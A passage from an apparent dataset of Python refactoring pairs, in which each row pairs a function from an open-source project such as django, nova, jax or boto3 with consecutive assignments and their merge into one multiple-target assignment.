script_name = 'add_sign_off.sh'","path , script_name  = git_dir(tempdir_factory), 'add_sign_off.sh'"
checkov,https://github.com/bridgecrewio/checkov/tree/master/tests/arm/checks/resource/test_StorageAccountAzureServicesAccessEnabled.py,TestStorageAccountAzureServicesAccessEnabled,test_summary$11,"def test_summary(self):
        runner = Runner()
        current_dir = os.path.dirname(os.path.realpath(__file__))

        test_files_dir = current_dir + ""/example_StorageAccountAzureServicesAccessEnabled""
        report = runner.run(root_folder=test_files_dir,runner_filter=RunnerFilter(checks=[check.id]))
        summary = report.get_summary()

        self.assertEqual(summary['passed'], 2)
        self.assertEqual(summary['failed'], 4)
        self.assertEqual(summary['skipped'], 0)
        self.assertEqual(summary['parsing_errors'], 0)","runner = Runner()
current_dir = os.path.dirname(os.path.realpath(__file__))","runner , current_dir  = Runner(), os.path.dirname(os.path.realpath(__file__))"
astropy,https://github.com/astropy/astropy/tree/master/astropy/modeling/polynomial.py,OrthoPolynomialBase,_invlex$365,"def _invlex(self):
        # TODO: This is a very slow way to do this; fix it and related methods
        # like _alpha
        c = []
        xvar = np.arange(self.x_degree + 1)
        yvar = np.arange(self.y_degree + 1)
        for j in yvar:
            for i in xvar:
                c.append((i, j))
        return np.array(c[::-1])","c = []
xvar = np.arange(self.x_degree + 1)
yvar = np.arange(self.y_degree + 1)","c , xvar , yvar  = [], np.arange(self.x_degree + 1), np.arange(self.y_degree + 1)"
machine_learning_python,https://github.com/SmallVagetable/machine_learning_python/tree/master/kmeans/kmeans_base.py,KMeansBase,update_labels_error$98,"def update_labels_error(self, dataset, centers):
        labels = self.assign_points(dataset, centers)
        new_means = defaultdict(list)
        error = 0
        for assignment, point in zip(labels, dataset):
            new_means[assignment].append(point)

        for points in new_means.values():
            newCenter = np.mean(points, axis=0)
            error += np.sqrt(np.sum(np.square(points - newCenter)))

        return labels, error","labels = self.assign_points(dataset, centers)
new_means = defaultdict(list)
error = 0","labels , new_means , error  = self.assign_points(dataset, centers), defaultdict(list), 0"
nova,https://github.com/openstack/nova/tree/master/nova/tests/unit/virt/libvirt/test_driver.py,LibvirtConnTestCase,test_attach_encryptor_unencrypted_volume_meta_provided$9963,"def test_attach_encryptor_unencrypted_volume_meta_provided(self,
            mock_get_encryptor, mock_get_metadata):
        """"""Assert that if an empty encryption metadata dict is provided that
        there is no additional attempt to lookup the metadata or attach the
        encryptor.
        """"""
        drvr = libvirt_driver.LibvirtDriver(fake.FakeVirtAPI(), False)
        encryption = {}
        connection_info = {'data': {'volume_id': uuids.volume_id}}

        drvr._attach_encryptor(self.context, connection_info, encryption)

        mock_get_metadata.assert_not_called()
        mock_get_encryptor.assert_not_called()","drvr = libvirt_driver.LibvirtDriver(fake.FakeVirtAPI(), False)
encryption = {}
connection_info = {'data': {'volume_id': uuids.volume_id}}","drvr , encryption , connection_info  = libvirt_driver.LibvirtDriver(fake.FakeVirtAPI(), False), {}, {'data': {'volume_id': uuids.volume_id}}"
recordlinkage,https://github.com/J535D165/recordlinkage/tree/master/tests/test_indexing.py,TestIndexAlgorithmApi,test_repr$120,"def test_repr(self, index_class):

        index_str = str(index_class)
        index_repr = repr(index_class)
        assert index_str == index_repr

        start_str = '<{}'.format(index_class.__class__.__name__)
        assert index_str.startswith(start_str)","index_str = str(index_class)
index_repr = repr(index_class)","index_str , index_repr  = str(index_class), repr(index_class)"
django,https://github.com/django/django/tree/master/django/db/backends/base/creation.py,BaseDatabaseCreation,destroy_test_db$259,"def destroy_test_db(self, old_database_name=None, verbosity=1, keepdb=False, suffix=None):
        """"""
        Destroy a test database, prompting the user for confirmation if the
        database already exists.
        """"""
        self.connection.close()
        if suffix is None:
            test_database_name = self.connection.settings_dict['NAME']
        else:
            test_database_name = self.get_test_db_clone_settings(suffix)['NAME']

        if verbosity >= 1:
            action = 'Destroying'
            if keepdb:
                action = 'Preserving'
            self.log('%s test database for alias %s...' % (
                action,
                self._get_database_display_str(verbosity, test_database_name),
            ))

        # if we want to preserve the database
        # skip the actual destroying piece.
        if not keepdb:
            self._destroy_test_db(test_database_name, verbosity)

        # Restore the original database name
        if old_database_name is not None:
            settings.DATABASES[self.connection.alias][""NAME""] = old_database_name
            self.connection.settings_dict[""NAME""] = old_database_name","settings.DATABASES[self.connection.alias]['NAME'] = old_database_name
self.connection.settings_dict['NAME'] = old_database_name","settings.DATABASES[self.connection.alias]['NAME'] , self.connection.settings_dict['NAME']  = old_database_name, old_database_name"
MaskFormer,https://github.com/facebookresearch/MaskFormer/tree/master/mask_former/modeling/heads/mask_former_head.py,MaskFormerHead,__init__$48,"def __init__(
        self,
        input_shape: Dict[str, ShapeSpec],
        *,
        num_classes: int,
        pixel_decoder: nn.Module,
        loss_weight: float = 1.0,
        ignore_value: int = -1,
        # extra parameters
        transformer_predictor: nn.Module,
        transformer_in_feature: str,
    ):
        """"""
        NOTE: this interface is experimental.
        Args:
            input_shape: shapes (channels and stride) of the input features
            num_classes: number of classes to predict
            pixel_decoder: the pixel decoder module
            loss_weight: loss weight
            ignore_value: category id to be ignored during training.
            transformer_predictor: the transformer decoder that makes prediction
            transformer_in_feature: input feature name to the transformer_predictor
        """"""
        super().__init__()
        input_shape = sorted(input_shape.items(), key=lambda x: x[1].stride)
        self.in_features = [k for k, v in input_shape]
        feature_strides = [v.stride for k, v in input_shape]
        feature_channels = [v.channels for k, v in input_shape]

        self.ignore_value = ignore_value
        self.common_stride = 4
        self.loss_weight = loss_weight

        self.pixel_decoder = pixel_decoder
        self.predictor = transformer_predictor
        self.transformer_in_feature = transformer_in_feature

        self.num_classes = num_classes","self.in_features = [k for (k, v) in input_shape]
feature_strides = [v.stride for (k, v) in input_shape]
feature_channels = [v.channels for (k, v) in input_shape]
self.ignore_value = ignore_value
self.common_stride = 4
self.loss_weight = loss_weight
self.pixel_decoder = pixel_decoder
self.predictor = transformer_predictor
self.transformer_in_feature = transformer_in_feature
self.num_classes = num_classes","self.in_features , feature_strides , feature_channels , self.ignore_value , self.common_stride , self.loss_weight , self.pixel_decoder , self.predictor , self.transformer_in_feature , self.num_classes  = [k for (k, v) in input_shape], [v.stride for (k, v) in input_shape], [v.channels for (k, v) in input_shape], ignore_value, 4, loss_weight, pixel_decoder, transformer_predictor, transformer_in_feature, num_classes"
R-Drop,https://github.com/dropreg/R-Drop/tree/master/huggingface_transformer_src/src/transformers/tokenization_utils_fast.py,PreTrainedTokenizerFast,_batch_encode_plus$351,"def _batch_encode_plus(
        self,
        batch_text_or_text_pairs: Union[
            List[TextInput], List[TextInputPair], List[PreTokenizedInput], List[PreTokenizedInputPair]
        ],
        add_special_tokens: bool = True,
        padding_strategy: PaddingStrategy = PaddingStrategy.DO_NOT_PAD,
        truncation_strategy: TruncationStrategy = TruncationStrategy.DO_NOT_TRUNCATE,
        max_length: Optional[int] = None,
        stride: int = 0,
        is_split_into_words: bool = False,
        pad_to_multiple_of: Optional[int] = None,
        return_tensors: Optional[str] = None,
        return_token_type_ids: Optional[bool] = None,
        return_attention_mask: Optional[bool] = None,
        return_overflowing_tokens: bool = False,
        return_special_tokens_mask: bool = False,
        return_offsets_mapping: bool = False,
        return_length: bool = False,
        verbose: bool = True,
    ) -> BatchEncoding:

        if not isinstance(batch_text_or_text_pairs, list):
            raise TypeError(f""batch_text_or_text_pairs has to be a list (got {type(batch_text_or_text_pairs)})"")

        # Set the truncation and padding strategy and restore the initial configuration
        self.set_truncation_and_padding(
            padding_strategy=padding_strategy,
            truncation_strategy=truncation_strategy,
            max_length=max_length,
            stride=stride,
            pad_to_multiple_of=pad_to_multiple_of,
        )

        encodings = self._tokenizer.encode_batch(
            batch_text_or_text_pairs,
            add_special_tokens=add_special_tokens,
            is_pretokenized=is_split_into_words,
        )

        # Convert encoding to dict
        # `Tokens` has type: Tuple[
        #                       List[Dict[str, List[List[int]]]] or List[Dict[str, 2D-Tensor]],
        #                       List[EncodingFast]
        #                    ]
        # with nested dimensions corresponding to batch, overflows, sequence length
        tokens_and_encodings = [
            self._convert_encoding(
                encoding=encoding,
                return_token_type_ids=return_token_type_ids,
                return_attention_mask=return_attention_mask,
                return_overflowing_tokens=return_overflowing_tokens,
                return_special_tokens_mask=return_special_tokens_mask,
                return_offsets_mapping=return_offsets_mapping,
                return_length=return_length,
                verbose=verbose,
            )
            for encoding in encodings
        ]

        # Convert the output to have dict[list] from list[dict] and remove the additional overflows dimension
        # From (variable) shape (batch, overflows, sequence length) to ~ (batch * overflows, sequence length)
        # (we say ~ because the number of overflow varies with the example in the batch)
        #
        # To match each overflowing sample with the original sample in the batch
        # we add an overflow_to_sample_mapping array (see below)
        sanitized_tokens = {}
        for key in tokens_and_encodings[0][0].keys():
            stack = [e for item, _ in tokens_and_encodings for e in item[key]]
            sanitized_tokens[key] = stack
        sanitized_encodings = [e for _, item in tokens_and_encodings for e in item]

        # If returning overflowing tokens, we need to return a mapping
        # from the batch idx to the original sample
        if return_overflowing_tokens:
            overflow_to_sample_mapping = []
            for i, (toks, _) in enumerate(tokens_and_encodings):
                overflow_to_sample_mapping += [i] * len(toks[""input_ids""])
            sanitized_tokens[""overflow_to_sample_mapping""] = overflow_to_sample_mapping

        for input_ids in sanitized_tokens[""input_ids""]:
            self._eventual_warn_about_too_long_sequence(input_ids, max_length, verbose)
        return BatchEncoding(sanitized_tokens, sanitized_encodings, tensor_type=return_tensors)","tokens_and_encodings = [self._convert_encoding(encoding=encoding, return_token_type_ids=return_token_type_ids, return_attention_mask=return_attention_mask, return_overflowing_tokens=return_overflowing_tokens, return_special_tokens_mask=return_special_tokens_mask, return_offsets_mapping=return_offsets_mapping, return_length=return_length, verbose=verbose) for encoding in encodings]
sanitized_tokens = {}","tokens_and_encodings , sanitized_tokens  = [self._convert_encoding(encoding=encoding, return_token_type_ids=return_token_type_ids, return_attention_mask=return_attention_mask, return_overflowing_tokens=return_overflowing_tokens, return_special_tokens_mask=return_special_tokens_mask, return_offsets_mapping=return_offsets_mapping, return_length=return_length, verbose=verbose) for encoding in encodings], {}"
lingvo,https://github.com/tensorflow/lingvo/tree/master/lingvo/tasks/mt/decoder.py,MTDecoderV1,_InitBeamSearchStateCallback$975,"def _InitBeamSearchStateCallback(self, theta, encoder_outputs,
                                   num_hyps_per_beam):
    """"""Returns initial beams search states.

    Args:
      theta: a NestedMap of parameters.
      encoder_outputs: a NestedMap computed by encoder.
      num_hyps_per_beam: An int, number hyps to keep for source sentence.

    Returns:
      A tuple (initial_results, states).
        initial_results: a `.NestedMap` of initial results.
          atten_probs:
            The initial attention probs, of shape [tgt_batch, src_len].
        states: a `.NestedMap` of initial model states.
          rnn_states:
            Initial state of the RNN.
          atten_context:
            Initial attention context vector.
          atten_states:
            Initial attention state.
    """"""
    p = self.params
    num_beams = py_utils.GetShape(encoder_outputs.padding)[1]
    num_hyps = num_beams * num_hyps_per_beam
    rnn_states, init_atten_context, atten_probs, atten_states = (
        self._InitDecoder(theta, encoder_outputs, num_hyps))

    initial_results = py_utils.NestedMap(
        log_probs=tf.zeros([num_hyps, p.softmax.num_classes],
                           dtype=py_utils.FPropDtype(p)),
        atten_probs=atten_probs)

    if p.init_step_ids and hasattr(encoder_outputs, 'init_step_ids'):
      initial_results['step_ids'] = tf.expand_dims(
          self._ExpandToNumHyps(encoder_outputs.init_step_ids,
                                num_hyps_per_beam), 1)
    states = py_utils.NestedMap({
        'time_step': tf.constant(0),
        'rnn_states': rnn_states,
        'atten_context': init_atten_context,
        'atten_probs': atten_probs,
        'atten_states': atten_states,
    })
    if p.force_alignment:
      states['num_sentences'] = tf.ones([num_hyps], dtype=tf.int32)
    return initial_results, states","p = self.params
num_beams = py_utils.GetShape(encoder_outputs.padding)[1]","p , num_beams  = self.params, py_utils.GetShape(encoder_outputs.padding)[1]"
boto3,https://github.com/boto/boto3/tree/master/tests/unit/docs/test_service.py,TestServiceDocumenter,test_document_service$22,"def test_document_service(self):
        service_documenter = ServiceDocumenter('myservice', self.session)
        contents = service_documenter.document_service().decode('utf-8')
        lines = [
            '*********',
            'MyService',
            '*********',
            '.. contents:: Table of Contents',
            '   :depth: 2',
            '======',
            'Client',
            '======',
            '.. py:class:: MyService.Client',
            '  These are the available methods:',
            '  *   :py:meth:`~MyService.Client.sample_operation`',
            '    **Examples** ',
            '    Sample Description.',
            '    ::',
            '      response = client.sample_operation(',
            '==========',
            'Paginators',
            '==========',
            'The available paginators are:',
            '* :py:class:`MyService.Paginator.SampleOperation`',
            '.. py:class:: MyService.Paginator.SampleOperation',
            '  .. py:method:: paginate(**kwargs)',
            '=======',
            'Waiters',
            '=======',
            'The available waiters are:',
            '* :py:class:`MyService.Waiter.SampleOperationComplete`',
            '.. py:class:: MyService.Waiter.SampleOperationComplete',
            '  .. py:method:: wait(**kwargs)',
            '================',
            'Service Resource',
            '================',
            '.. py:class:: MyService.ServiceResource()',
            ""  These are the resource's available actions:"",
            '  *   :py:meth:`sample_operation()`',
            ""  These are the resource's available sub-resources:"",
            '  *   :py:meth:`Sample()`',
            ""  These are the resource's available collections:"",
            '  *   :py:attr:`samples`',
            '  .. py:method:: sample_operation(**kwargs)',
            '  .. py:method:: Sample(name)',
            '  .. py:attribute:: samples',
            '    .. py:method:: all()',
            '    .. py:method:: filter(**kwargs)',
            '    .. py:method:: limit(**kwargs)',
            '    .. py:method:: page_size(**kwargs)',
            '======',
            'Sample',
            '======',
            '.. py:class:: MyService.Sample(name)',
            ""  These are the resource's available identifiers:"",
            '  *   :py:attr:`name`',
            ""  These are the resource's available attributes:"",
            '  *   :py:attr:`bar`',
            '  *   :py:attr:`foo`',
            ""  These are the resource's available actions:"",
            '  *   :py:meth:`load()`',
            '  *   :py:meth:`operate()`',
            '  *   :py:meth:`reload()`',
            ""  These are the resource's available waiters:"",
            '  *   :py:meth:`wait_until_complete()`',
            '  .. py:attribute:: name',
            '  .. py:attribute:: bar',
            '  .. py:attribute:: foo',
            '  .. py:method:: load()',
            '  .. py:method:: operate(**kwargs)',
            '  .. py:method:: reload()',
            '  .. py:method:: wait_until_complete(**kwargs)',
        ]
        self.assert_contains_lines_in_order(lines, contents)","contents = service_documenter.document_service().decode('utf-8')
lines = ['*********', 'MyService', '*********', '.. contents:: Table of Contents', '   :depth: 2', '======', 'Client', '======', '.. py:class:: MyService.Client', '  These are the available methods:', '  *   :py:meth:`~MyService.Client.sample_operation`', '    **Examples** ', '    Sample Description.', '    ::', '      response = client.sample_operation(', '==========', 'Paginators', '==========', 'The available paginators are:', '* :py:class:`MyService.Paginator.SampleOperation`', '.. py:class:: MyService.Paginator.SampleOperation', '  .. py:method:: paginate(**kwargs)', '=======', 'Waiters', '=======', 'The available waiters are:', '* :py:class:`MyService.Waiter.SampleOperationComplete`', '.. py:class:: MyService.Waiter.SampleOperationComplete', '  .. py:method:: wait(**kwargs)', '================', 'Service Resource', '================', '.. py:class:: MyService.ServiceResource()', ""  These are the resource's available actions:"", '  *   :py:meth:`sample_operation()`', ""  These are the resource's available sub-resources:"", '  *   :py:meth:`Sample()`', ""  These are the resource's available collections:"", '  *   :py:attr:`samples`', '  .. py:method:: sample_operation(**kwargs)', '  .. py:method:: Sample(name)', '  .. py:attribute:: samples', '    .. py:method:: all()', '    .. py:method:: filter(**kwargs)', '    .. py:method:: limit(**kwargs)', '    .. py:method:: page_size(**kwargs)', '======', 'Sample', '======', '.. py:class:: MyService.Sample(name)', ""  These are the resource's available identifiers:"", '  *   :py:attr:`name`', ""  These are the resource's available attributes:"", '  *   :py:attr:`bar`', '  *   :py:attr:`foo`', ""  These are the resource's available actions:"", '  *   :py:meth:`load()`', '  *   :py:meth:`operate()`', '  *   :py:meth:`reload()`', ""  These are the resource's available waiters:"", '  *   :py:meth:`wait_until_complete()`', '  .. py:attribute:: name', '  .. py:attribute:: bar', '  .. py:attribute:: foo', '  .. py:method:: load()', '  .. py:method:: operate(**kwargs)', '  .. py:method:: reload()', '  .. py:method:: wait_until_complete(**kwargs)']","contents , lines  = service_documenter.document_service().decode('utf-8'), ['*********', 'MyService', '*********', '.. contents:: Table of Contents', '   :depth: 2', '======', 'Client', '======', '.. py:class:: MyService.Client', '  These are the available methods:', '  *   :py:meth:`~MyService.Client.sample_operation`', '    **Examples** ', '    Sample Description.', '    ::', '      response = client.sample_operation(', '==========', 'Paginators', '==========', 'The available paginators are:', '* :py:class:`MyService.Paginator.SampleOperation`', '.. py:class:: MyService.Paginator.SampleOperation', '  .. py:method:: paginate(**kwargs)', '=======', 'Waiters', '=======', 'The available waiters are:', '* :py:class:`MyService.Waiter.SampleOperationComplete`', '.. py:class:: MyService.Waiter.SampleOperationComplete', '  .. py:method:: wait(**kwargs)', '================', 'Service Resource', '================', '.. py:class:: MyService.ServiceResource()', ""  These are the resource's available actions:"", '  *   :py:meth:`sample_operation()`', ""  These are the resource's available sub-resources:"", '  *   :py:meth:`Sample()`', ""  These are the resource's available collections:"", '  *   :py:attr:`samples`', '  .. py:method:: sample_operation(**kwargs)', '  .. py:method:: Sample(name)', '  .. py:attribute:: samples', '    .. py:method:: all()', '    .. py:method:: filter(**kwargs)', '    .. py:method:: limit(**kwargs)', '    .. py:method:: page_size(**kwargs)', '======', 'Sample', '======', '.. py:class:: MyService.Sample(name)', ""  These are the resource's available identifiers:"", '  *   :py:attr:`name`', ""  These are the resource's available attributes:"", '  *   :py:attr:`bar`', '  *   :py:attr:`foo`', ""  These are the resource's available actions:"", '  *   :py:meth:`load()`', '  *   :py:meth:`operate()`', '  *   :py:meth:`reload()`', ""  These are the resource's available waiters:"", '  *   :py:meth:`wait_until_complete()`', '  .. py:attribute:: name', '  .. py:attribute:: bar', '  .. py:attribute:: foo', '  .. py:method:: load()', '  .. py:method:: operate(**kwargs)', '  .. py:method:: reload()', '  .. py:method:: wait_until_complete(**kwargs)']"
vectorbt,https://github.com/polakowo/vectorbt/tree/master/vectorbt/portfolio/base.py,Portfolio,cash$4241,"def cash(self, group_by: tp.GroupByLike = None, in_sim_order: bool = False, free: bool = False,
             wrap_kwargs: tp.KwargsLike = None) -> tp.SeriesFrame:
        """"""Get cash balance series per column/group.

        See the explanation on `in_sim_order` in `Portfolio.value`.
        For `free`, see `Portfolio.cash_flow`.""""""
        if in_sim_order and not self.cash_sharing:
            raise ValueError(""Cash sharing must be enabled for in_sim_order=True"")

        cash_flow = to_2d_array(self.cash_flow(group_by=group_by, free=free))
        if self.wrapper.grouper.is_grouped(group_by=group_by):
            group_lens = self.wrapper.grouper.get_group_lens(group_by=group_by)
            init_cash = to_1d_array(self.get_init_cash(group_by=group_by))
            cash = nb.cash_grouped_nb(
                self.wrapper.shape_2d,
                cash_flow,
                group_lens,
                init_cash
            )
        else:
            if self.wrapper.grouper.is_grouping_disabled(group_by=group_by) and in_sim_order:
                if self.call_seq is None:
                    raise ValueError(""No call sequence attached. ""
                                     ""Pass `attach_call_seq=True` to the class method ""
                                     ""(flexible simulations are not supported)"")
                group_lens = self.wrapper.grouper.get_group_lens()
                init_cash = to_1d_array(self.init_cash)
                call_seq = to_2d_array(self.call_seq)
                cash = nb.cash_in_sim_order_nb(cash_flow, group_lens, init_cash, call_seq)
            else:
                init_cash = to_1d_array(self.get_init_cash(group_by=False))
                cash = nb.cash_nb(cash_flow, init_cash)
        return self.wrapper.wrap(cash, group_by=group_by, **merge_dicts({}, wrap_kwargs))","group_lens = self.wrapper.grouper.get_group_lens(group_by=group_by)
init_cash = to_1d_array(self.get_init_cash(group_by=group_by))","group_lens , init_cash  = self.wrapper.grouper.get_group_lens(group_by=group_by), to_1d_array(self.get_init_cash(group_by=group_by))"
vectorbt,https://github.com/polakowo/vectorbt/tree/master/vectorbt/portfolio/base.py,Portfolio,cash$4241,"def cash(self, group_by: tp.GroupByLike = None, in_sim_order: bool = False, free: bool = False,
             wrap_kwargs: tp.KwargsLike = None) -> tp.SeriesFrame:
        """"""Get cash balance series per column/group.

        See the explanation on `in_sim_order` in `Portfolio.value`.
        For `free`, see `Portfolio.cash_flow`.""""""
        if in_sim_order and not self.cash_sharing:
            raise ValueError(""Cash sharing must be enabled for in_sim_order=True"")

        cash_flow = to_2d_array(self.cash_flow(group_by=group_by, free=free))
        if self.wrapper.grouper.is_grouped(group_by=group_by):
            group_lens = self.wrapper.grouper.get_group_lens(group_by=group_by)
            init_cash = to_1d_array(self.get_init_cash(group_by=group_by))
            cash = nb.cash_grouped_nb(
                self.wrapper.shape_2d,
                cash_flow,
                group_lens,
                init_cash
            )
        else:
            if self.wrapper.grouper.is_grouping_disabled(group_by=group_by) and in_sim_order:
                if self.call_seq is None:
                    raise ValueError(""No call sequence attached. ""
                                     ""Pass `attach_call_seq=True` to the class method ""
                                     ""(flexible simulations are not supported)"")
                group_lens = self.wrapper.grouper.get_group_lens()
                init_cash = to_1d_array(self.init_cash)
                call_seq = to_2d_array(self.call_seq)
                cash = nb.cash_in_sim_order_nb(cash_flow, group_lens, init_cash, call_seq)
            else:
                init_cash = to_1d_array(self.get_init_cash(group_by=False))
                cash = nb.cash_nb(cash_flow, init_cash)
        return self.wrapper.wrap(cash, group_by=group_by, **merge_dicts({}, wrap_kwargs))","group_lens = self.wrapper.grouper.get_group_lens()
init_cash = to_1d_array(self.init_cash)
call_seq = to_2d_array(self.call_seq)","group_lens , init_cash , call_seq  = self.wrapper.grouper.get_group_lens(), to_1d_array(self.init_cash), to_2d_array(self.call_seq)"
salt,https://github.com/saltstack/salt/tree/master/salt/modules/archive.py,,_list_zip$242,"def _list_zip(name, cached):
        """"""
        List the contents of a zip archive.
        Password-protected ZIP archives can still be listed by zipfile, so
        there is no reason to invoke the unzip command.
        """"""
        dirs = set()
        files = []
        links = []
        try:
            with contextlib.closing(zipfile.ZipFile(cached)) as zip_archive:
                for member in zip_archive.infolist():
                    path = member.filename
                    if salt.utils.platform.is_windows():
                        if path.endswith(""/""):
                            # zipfile.ZipInfo objects on windows use forward
                            # slash at end of the directory name.
                            dirs.add(path)
                        else:
                            files.append(path)
                    else:
                        mode = member.external_attr >> 16
                        if stat.S_ISLNK(mode):
                            links.append(path)
                        elif stat.S_ISDIR(mode):
                            dirs.add(path)
                        else:
                            files.append(path)

                _files = copy.deepcopy(files)
                for path in _files:
                    # ZIP files created on Windows do not add entries
                    # to the archive for directories. So, we'll need to
                    # manually add them.
                    dirname = """".join(path.rpartition(""/"")[:2])
                    if dirname:
                        dirs.add(dirname)
                        if dirname in files:
                            files.remove(dirname)
            return list(dirs), files, links
        except zipfile.BadZipfile:
            raise CommandExecutionError(""{} is not a ZIP file"".format(name))","dirs = set()
files = []
links = []","dirs , files , links  = set(), [], []"
K-BERT,https://github.com/autoliuweijie/K-BERT/tree/master/uer/utils/data.py,MlmDataset,worker$841,"def worker(self, proc_id, start, end):
        print(""Worker %d is building dataset ... "" % proc_id)
        set_seed(self.seed)
        pos = start
        f_write = open(""dataset-tmp-"" + str(proc_id) + "".pt"", ""wb"")
        # Open function in python3 does not support tell operation. We have to use codecs.
        with codecs.open(self.corpus_path, ""r"", ""utf-8"") as f:
            instances = []
            for _ in range(self.dup_factor):
                f.seek(start)
                while True:
                    try:
                        line = f.readline()
                    except:
                        continue

                    src = [self.vocab.get(w) for w in self.tokenizer.tokenize(line)]
                    src, tgt = mask_seq(src, len(self.vocab))
                    seg = [1] * len(src)
                    if len(src) >= self.seq_length:
                        src = src[:self.seq_length]
                        tgt = tgt[:self.seq_length]
                        seg = seg[:self.seq_length]
                    else:
                        while len(src) != self.seq_length:
                            src.append(PAD_ID)
                            tgt.append(PAD_ID)
                            seg.append(PAD_ID)

                    instances.append((src, tgt, seg))

                    pos = f.tell()
                    if pos >= end:
                        break

        pickle.dump(instances, f_write)
        f_write.close()","pos = start
f_write = open('dataset-tmp-' + str(proc_id) + '.pt', 'wb')","pos , f_write  = start, open('dataset-tmp-' + str(proc_id) + '.pt', 'wb')"
K-BERT,https://github.com/autoliuweijie/K-BERT/tree/master/uer/utils/data.py,MlmDataset,worker$841,"def worker(self, proc_id, start, end):
        print(""Worker %d is building dataset ... "" % proc_id)
        set_seed(self.seed)
        pos = start
        f_write = open(""dataset-tmp-"" + str(proc_id) + "".pt"", ""wb"")
        # Open function in python3 does not support tell operation. We have to use codecs.
        with codecs.open(self.corpus_path, ""r"", ""utf-8"") as f:
            instances = []
            for _ in range(self.dup_factor):
                f.seek(start)
                while True:
                    try:
                        line = f.readline()
                    except:
                        continue

                    src = [self.vocab.get(w) for w in self.tokenizer.tokenize(line)]
                    src, tgt = mask_seq(src, len(self.vocab))
                    seg = [1] * len(src)
                    if len(src) >= self.seq_length:
                        src = src[:self.seq_length]
                        tgt = tgt[:self.seq_length]
                        seg = seg[:self.seq_length]
                    else:
                        while len(src) != self.seq_length:
                            src.append(PAD_ID)
                            tgt.append(PAD_ID)
                            seg.append(PAD_ID)

                    instances.append((src, tgt, seg))

                    pos = f.tell()
                    if pos >= end:
                        break

        pickle.dump(instances, f_write)
        f_write.close()","src = src[:self.seq_length]
tgt = tgt[:self.seq_length]
seg = seg[:self.seq_length]","src , tgt , seg  = src[:self.seq_length], tgt[:self.seq_length], seg[:self.seq_length]"
jax,https://github.com/google/jax/tree/master/tests/batching_test.py,BatchingTest,testRandom$403,"def testRandom(self):
    seeds = vmap(random.PRNGKey)(np.arange(10))
    ans = vmap(partial(random.normal, shape=(3, 2)))(seeds)
    expected = np.stack([random.normal(random.PRNGKey(seed), (3, 2))
                          for seed in np.arange(10)])
    self.assertAllClose(ans, expected, check_dtypes=False)
    assert len(np.unique(ans)) == 10 * 3 * 2","ans = vmap(partial(random.normal, shape=(3, 2)))(seeds)
expected = np.stack([random.normal(random.PRNGKey(seed), (3, 2)) for seed in np.arange(10)])","ans , expected  = vmap(partial(random.normal, shape=(3, 2)))(seeds), np.stack([random.normal(random.PRNGKey(seed), (3, 2)) for seed in np.arange(10)])"
ibis,https://github.com/ibis-project/ibis/tree/master/ibis/backends/pyspark/tests/test_ddl.py,,test_insert_table$109,"def test_insert_table(client, alltypes, temp_table, test_data_db):
    expr = alltypes
    table_name = temp_table
    db = test_data_db

    client.create_table(table_name, expr.limit(0), database=db)

    client.insert(table_name, expr.limit(10), database=db)

    # check using SparkTable.insert
    t = client.table(table_name, database=db)
    t.insert(expr.limit(10))

    sz = t.count()
    assert sz.execute() == 20

    # Overwrite and verify only 10 rows now
    t.insert(expr.limit(10), overwrite=True)
    assert sz.execute() == 10","expr = alltypes
table_name = temp_table
db = test_data_db","expr , table_name , db  = alltypes, temp_table, test_data_db"
scattertext,https://github.com/JasonKessler/scattertext/tree/master/scattertext/representations/CategoryEmbeddings.py,EmbeddingAligner,get_report_df$193,"def get_report_df(self, n_terms=5):
        conterpart_idx = np.hstack([np.arange(len(self.terms)) + len(self.terms),
                                    np.arange(len(self.terms))])
        idx = np.arange(len(self.terms))
        similarity_df = pd.DataFrame({
            'cosine_distance': self.pairwise_sim[[idx], conterpart_idx[idx]][0],
            'rank_' + self.prefix1: np.where(
                self.pairwise_sim_sort[idx] == conterpart_idx[idx][:, None]
            )[1],
            'rank_' + self.prefix2: np.where(
                self.pairwise_sim_sort[conterpart_idx[idx]] == idx[:, None]
            )[1],
            'context_' + self.prefix1: pd.DataFrame(
                self.labeled_terms[self.pairwise_sim_sort[idx, 1:1 + n_terms]]
            ).apply(', '.join, axis=1).values,
            'context_' + self.prefix2: pd.DataFrame(
                self.labeled_terms[self.pairwise_sim_sort[conterpart_idx[idx], 1:1 + n_terms]]
            ).apply(', '.join, axis=1).values,
        },
            index=self.terms
        )
        return pd.merge(
            similarity_df
                .assign(min_rank=lambda x: np.max(x[['rank_' + self.prefix1, 'rank_' + self.prefix1]], axis=1))
                .sort_values(by='min_rank', ascending=False),
            self.category_embedding_resolver.corpus_
                .get_term_freq_df(),
            left_index=True,
            right_index=True
        )","conterpart_idx = np.hstack([np.arange(len(self.terms)) + len(self.terms), np.arange(len(self.terms))])
idx = np.arange(len(self.terms))","conterpart_idx , idx  = np.hstack([np.arange(len(self.terms)) + len(self.terms), np.arange(len(self.terms))]), np.arange(len(self.terms))"
nmt,https://github.com/tensorflow/nmt/tree/master/nmt/gnmt_model.py,,gnmt_residual_fn$310,"def gnmt_residual_fn(inputs, outputs):
  """"""Residual function that handles different inputs and outputs inner dims.

  Args:
    inputs: cell inputs, this is actual inputs concatenated with the attention
      vector.
    outputs: cell outputs

  Returns:
    outputs + actual inputs
  """"""
  def split_input(inp, out):
    out_dim = out.get_shape().as_list()[-1]
    inp_dim = inp.get_shape().as_list()[-1]
    return tf.split(inp, [out_dim, inp_dim - out_dim], axis=-1)
  actual_inputs, _ = tf.contrib.framework.nest.map_structure(
      split_input, inputs, outputs)
  def assert_shape_match(inp, out):
    inp.get_shape().assert_is_compatible_with(out.get_shape())
  tf.contrib.framework.nest.assert_same_structure(actual_inputs, outputs)
  tf.contrib.framework.nest.map_structure(
      assert_shape_match, actual_inputs, outputs)
  return tf.contrib.framework.nest.map_structure(
      lambda inp, out: inp + out, actual_inputs, outputs)","out_dim = out.get_shape().as_list()[-1]
inp_dim = inp.get_shape().as_list()[-1]","out_dim , inp_dim  = out.get_shape().as_list()[-1], inp.get_shape().as_list()[-1]"
swift,https://github.com/openstack/swift/tree/master/swift/common/db.py,GreenDBCursor,__init__$155,"def __init__(self, *args, **kwargs):
        self.timeout = args[0].timeout
        self.db_file = args[0].db_file
        super(GreenDBCursor, self).__init__(*args, **kwargs)","self.timeout = args[0].timeout
self.db_file = args[0].db_file","self.timeout , self.db_file  = args[0].timeout, args[0].db_file"
Paddle,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/distributed/fleet/meta_optimizers/pipeline_optimizer.py,PipelineOptimizer,minimize_impl$200,"def minimize_impl(
        self, loss, startup_program=None, parameter_list=None, no_grad_set=None
    ):
